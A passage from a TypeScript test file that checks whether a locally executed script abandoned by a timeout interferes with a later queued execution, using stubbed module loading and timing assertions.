                                return 'b-result';
                            },
                        };
                    }
                    const notFoundError: NodeJS.ErrnoException = new Error(
                        `Cannot find module '${specifier}'`,
                    );
                    notFoundError.code = 'MODULE_NOT_FOUND';
                    throw notFoundError;
                };
            };

            // A times out at 20ms, well before its own 150ms-delayed loadModule resolves.
            const abandoned = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                makeLoadModule(150),
                mockLogger,
                20,
            );
            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);

            // B starts as soon as the queue frees, and is still running its own 200ms body when A's loadModule resolves at the ~150ms mark.
            const second = executeScriptLocally(
                func,
                TEST_PROJECT_ROOT,
                [],
                stubExecuteAction,
                makeLoadModule(0),
                mockLogger,
            );

            await expect(second).resolves.toEqual({ data: 'b-result' });
        });
    });
});
